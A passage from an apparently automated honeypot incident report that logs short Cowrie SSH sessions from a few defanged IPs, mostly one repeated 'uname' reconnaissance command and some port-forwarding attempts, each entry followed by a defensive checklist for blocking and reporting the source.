| `2026-07-28 05:20:33` | `cowrie.session.connect` |
| `2026-07-28 05:20:34` | `cowrie.client.version` |
| `2026-07-28 05:20:34` | `cowrie.client.kex` |
| `2026-07-28 05:20:35` | `cowrie.login.success` |
| `2026-07-28 05:20:35` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd065218bdb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:36` | `cowrie.session.connect` |
| `2026-07-28 05:20:36` | `cowrie.client.version` |
| `2026-07-28 05:20:36` | `cowrie.client.kex` |
| `2026-07-28 05:20:37` | `cowrie.login.success` |
| `2026-07-28 05:20:39` | `cowrie.session.params` |
| `2026-07-28 05:20:39` | `cowrie.command.input` |
| `2026-07-28 05:20:39` | `cowrie.log.closed` |
| `2026-07-28 05:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d44a672c6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:42` | `cowrie.session.connect` |
| `2026-07-28 05:20:42` | `cowrie.client.version` |
| `2026-07-28 05:20:42` | `cowrie.client.kex` |
| `2026-07-28 05:20:43` | `cowrie.login.success` |
| `2026-07-28 05:20:44` | `cowrie.session.params` |
| `2026-07-28 05:20:44` | `cowrie.command.input` |
| `2026-07-28 05:20:45` | `cowrie.log.closed` |
| `2026-07-28 05:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-950376bfd1fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:48` | `cowrie.session.connect` |
| `2026-07-28 05:20:48` | `cowrie.client.version` |
| `2026-07-28 05:20:48` | `cowrie.client.kex` |
| `2026-07-28 05:20:50` | `cowrie.login.success` |
| `2026-07-28 05:20:51` | `cowrie.session.params` |
| `2026-07-28 05:20:51` | `cowrie.command.input` |
| `2026-07-28 05:20:52` | `cowrie.log.closed` |
| `2026-07-28 05:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-746731b76c11

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:54` | `cowrie.session.connect` |
| `2026-07-28 05:20:54` | `cowrie.client.version` |
| `2026-07-28 05:20:54` | `cowrie.client.kex` |
| `2026-07-28 05:20:56` | `cowrie.login.success` |
| `2026-07-28 05:20:58` | `cowrie.session.params` |
| `2026-07-28 05:20:58` | `cowrie.command.input` |
| `2026-07-28 05:20:59` | `cowrie.log.closed` |
| `2026-07-28 05:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa7919d72ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:20 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:20:59` | `cowrie.session.connect` |
| `2026-07-28 05:21:00` | `cowrie.client.version` |
| `2026-07-28 05:21:00` | `cowrie.client.kex` |
| `2026-07-28 05:21:03` | `cowrie.login.success` |
| `2026-07-28 05:21:05` | `cowrie.session.params` |
| `2026-07-28 05:21:05` | `cowrie.command.input` |
| `2026-07-28 05:21:05` | `cowrie.log.closed` |
| `2026-07-28 05:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d3f2aeafe8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:06` | `cowrie.session.connect` |
| `2026-07-28 05:21:06` | `cowrie.client.version` |
| `2026-07-28 05:21:06` | `cowrie.client.kex` |
| `2026-07-28 05:21:09` | `cowrie.login.success` |
| `2026-07-28 05:21:11` | `cowrie.session.params` |
| `2026-07-28 05:21:11` | `cowrie.command.input` |
| `2026-07-28 05:21:12` | `cowrie.log.closed` |
| `2026-07-28 05:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436c916355cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:11` | `cowrie.session.connect` |
| `2026-07-28 05:21:12` | `cowrie.client.version` |
| `2026-07-28 05:21:12` | `cowrie.client.kex` |
| `2026-07-28 05:21:15` | `cowrie.login.success` |
| `2026-07-28 05:21:18` | `cowrie.session.params` |
| `2026-07-28 05:21:18` | `cowrie.command.input` |
| `2026-07-28 05:21:19` | `cowrie.log.closed` |
| `2026-07-28 05:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3b39540ee54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:17` | `cowrie.session.connect` |
| `2026-07-28 05:21:18` | `cowrie.client.version` |
| `2026-07-28 05:21:18` | `cowrie.client.kex` |
| `2026-07-28 05:21:21` | `cowrie.login.success` |
| `2026-07-28 05:21:24` | `cowrie.session.params` |
| `2026-07-28 05:21:24` | `cowrie.command.input` |
| `2026-07-28 05:21:25` | `cowrie.log.closed` |
| `2026-07-28 05:21:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efce5486f9f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:23` | `cowrie.session.connect` |
| `2026-07-28 05:21:24` | `cowrie.client.version` |
| `2026-07-28 05:21:24` | `cowrie.client.kex` |
| `2026-07-28 05:21:27` | `cowrie.login.success` |
| `2026-07-28 05:21:29` | `cowrie.session.params` |
| `2026-07-28 05:21:29` | `cowrie.command.input` |
| `2026-07-28 05:21:30` | `cowrie.log.closed` |
| `2026-07-28 05:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff9e1ece4cd4

| Field | Detail |
|---|---|
| **Source IP** | `64.62.156[.]24` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:29` | `cowrie.session.connect` |
| `2026-07-28 05:21:29` | `cowrie.login.success` |
| `2026-07-28 05:21:30` | `cowrie.session.params` |
| `2026-07-28 05:21:30` | `cowrie.command.input` |
| `2026-07-28 05:21:30` | `cowrie.command.input` |
| `2026-07-28 05:21:30` | `cowrie.command.failed` |
| `2026-07-28 05:21:30` | `cowrie.command.input` |
| `2026-07-28 05:21:30` | `cowrie.command.failed` |
| `2026-07-28 05:21:30` | `cowrie.command.input` |
| `2026-07-28 05:21:30` | `cowrie.log.closed` |
| `2026-07-28 05:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.62.156[.]24` to AbuseIPDB if not already reported
- [ ] Block `64.62.156[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa1a905c923d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:30` | `cowrie.session.connect` |
| `2026-07-28 05:21:31` | `cowrie.client.version` |
| `2026-07-28 05:21:31` | `cowrie.client.kex` |
| `2026-07-28 05:21:32` | `cowrie.login.success` |
| `2026-07-28 05:21:33` | `cowrie.session.params` |
| `2026-07-28 05:21:33` | `cowrie.command.input` |
| `2026-07-28 05:21:33` | `cowrie.log.closed` |
| `2026-07-28 05:21:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50b4b5bae71

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:37` | `cowrie.session.connect` |
| `2026-07-28 05:21:37` | `cowrie.client.version` |
| `2026-07-28 05:21:37` | `cowrie.client.kex` |
| `2026-07-28 05:21:38` | `cowrie.login.success` |
| `2026-07-28 05:21:39` | `cowrie.session.params` |
| `2026-07-28 05:21:39` | `cowrie.command.input` |
| `2026-07-28 05:21:39` | `cowrie.log.closed` |
| `2026-07-28 05:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4fd62d77a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:43` | `cowrie.session.connect` |
| `2026-07-28 05:21:43` | `cowrie.client.version` |
| `2026-07-28 05:21:43` | `cowrie.client.kex` |
| `2026-07-28 05:21:45` | `cowrie.login.success` |
| `2026-07-28 05:21:46` | `cowrie.session.params` |
| `2026-07-28 05:21:46` | `cowrie.command.input` |
| `2026-07-28 05:21:46` | `cowrie.log.closed` |
| `2026-07-28 05:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9f55abebdfd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:49` | `cowrie.session.connect` |
| `2026-07-28 05:21:49` | `cowrie.client.version` |
| `2026-07-28 05:21:49` | `cowrie.client.kex` |
| `2026-07-28 05:21:50` | `cowrie.login.success` |
| `2026-07-28 05:21:51` | `cowrie.session.params` |
| `2026-07-28 05:21:51` | `cowrie.command.input` |
| `2026-07-28 05:21:52` | `cowrie.log.closed` |
| `2026-07-28 05:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c3860846b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:21 |
| **Last Seen** | 2026-07-28 05:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:21:55` | `cowrie.session.connect` |
| `2026-07-28 05:21:56` | `cowrie.client.version` |
| `2026-07-28 05:21:56` | `cowrie.client.kex` |
| `2026-07-28 05:21:56` | `cowrie.login.success` |
| `2026-07-28 05:21:57` | `cowrie.session.params` |
| `2026-07-28 05:21:57` | `cowrie.command.input` |
| `2026-07-28 05:21:58` | `cowrie.log.closed` |
| `2026-07-28 05:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7df35ed49a33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:22 |
| **Last Seen** | 2026-07-28 05:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:22:01` | `cowrie.session.connect` |
| `2026-07-28 05:22:02` | `cowrie.client.version` |
| `2026-07-28 05:22:02` | `cowrie.client.kex` |
| `2026-07-28 05:22:03` | `cowrie.login.success` |
| `2026-07-28 05:22:04` | `cowrie.session.params` |
| `2026-07-28 05:22:04` | `cowrie.command.input` |
| `2026-07-28 05:22:05` | `cowrie.log.closed` |
| `2026-07-28 05:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-340bf13cb86f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:22 |
| **Last Seen** | 2026-07-28 05:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:22:08` | `cowrie.session.connect` |
| `2026-07-28 05:22:08` | `cowrie.client.version` |
| `2026-07-28 05:22:08` | `cowrie.client.kex` |
| `2026-07-28 05:22:09` | `cowrie.login.success` |
| `2026-07-28 05:22:11` | `cowrie.session.params` |
| `2026-07-28 05:22:11` | `cowrie.command.input` |
| `2026-07-28 05:22:11` | `cowrie.log.closed` |
| `2026-07-28 05:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac91e579555

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:22 |
| **Last Seen** | 2026-07-28 05:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:22:14` | `cowrie.session.connect` |
| `2026-07-28 05:22:15` | `cowrie.client.version` |
| `2026-07-28 05:22:15` | `cowrie.client.kex` |
| `2026-07-28 05:22:15` | `cowrie.login.success` |
| `2026-07-28 05:22:16` | `cowrie.session.params` |
| `2026-07-28 05:22:16` | `cowrie.command.input` |
| `2026-07-28 05:22:17` | `cowrie.log.closed` |
| `2026-07-28 05:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea1406e8168

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-07-28 05:22 |
| **Last Seen** | 2026-07-28 05:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:22:15` | `cowrie.session.connect` |
| `2026-07-28 05:22:16` | `cowrie.client.version` |
| `2026-07-28 05:22:16` | `cowrie.client.kex` |
| `2026-07-28 05:22:18` | `cowrie.login.success` |
| `2026-07-28 05:22:19` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006392c9382d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:22 |
| **Last Seen** | 2026-07-28 05:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:22:20` | `cowrie.session.connect` |
| `2026-07-28 05:22:21` | `cowrie.client.version` |
| `2026-07-28 05:22:21` | `cowrie.client.kex` |
| `2026-07-28 05:22:22` | `cowrie.login.success` |
| `2026-07-28 05:22:23` | `cowrie.session.params` |
| `2026-07-28 05:22:23` | `cowrie.command.input` |
| `2026-07-28 05:22:24` | `cowrie.log.closed` |
| `2026-07-28 05:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510dff19bb16

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:22 |
| **Last Seen** | 2026-07-28 05:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:22:27` | `cowrie.session.connect` |
| `2026-07-28 05:22:27` | `cowrie.client.version` |
| `2026-07-28 05:22:27` | `cowrie.client.kex` |
| `2026-07-28 05:22:28` | `cowrie.login.success` |
| `2026-07-28 05:22:29` | `cowrie.session.params` |
| `2026-07-28 05:22:29` | `cowrie.command.input` |
| `2026-07-28 05:22:29` | `cowrie.log.closed` |
| `2026-07-28 05:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3721da45c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:22 |
| **Last Seen** | 2026-07-28 05:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:22:33` | `cowrie.session.connect` |
| `2026-07-28 05:22:33` | `cowrie.client.version` |
| `2026-07-28 05:22:33` | `cowrie.client.kex` |
| `2026-07-28 05:22:34` | `cowrie.login.success` |
| `2026-07-28 05:22:35` | `cowrie.session.params` |
| `2026-07-28 05:22:35` | `cowrie.command.input` |
| `2026-07-28 05:22:35` | `cowrie.log.closed` |
| `2026-07-28 05:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a9d4da59f0f

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-07-28 05:23 |
| **Last Seen** | 2026-07-28 05:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:23:31` | `cowrie.session.connect` |
| `2026-07-28 05:23:31` | `cowrie.client.version` |
| `2026-07-28 05:23:31` | `cowrie.client.kex` |
| `2026-07-28 05:23:33` | `cowrie.login.success` |
| `2026-07-28 05:23:34` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4079841ca5

| Field | Detail |
|---|---|
| **Source IP** | `222.86.168[.]224` |
| **First Seen** | 2026-07-28 05:23 |
| **Last Seen** | 2026-07-28 05:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:23:39` | `cowrie.session.connect` |
| `2026-07-28 05:23:41` | `cowrie.client.version` |
| `2026-07-28 05:23:41` | `cowrie.client.kex` |
| `2026-07-28 05:23:43` | `cowrie.login.success` |
| `2026-07-28 05:23:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.86.168[.]224` to AbuseIPDB if not already reported
- [ ] Block `222.86.168[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b75580d5144

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 05:26 |
| **Last Seen** | 2026-07-28 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:26:27` | `cowrie.session.connect` |
| `2026-07-28 05:26:27` | `cowrie.client.version` |
| `2026-07-28 05:26:27` | `cowrie.client.kex` |
| `2026-07-28 05:26:27` | `cowrie.login.success` |
| `2026-07-28 05:26:27` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:26:27` | `cowrie.direct-tcpip.data` |
| `2026-07-28 05:26:28` | `cowrie.session.closed` |

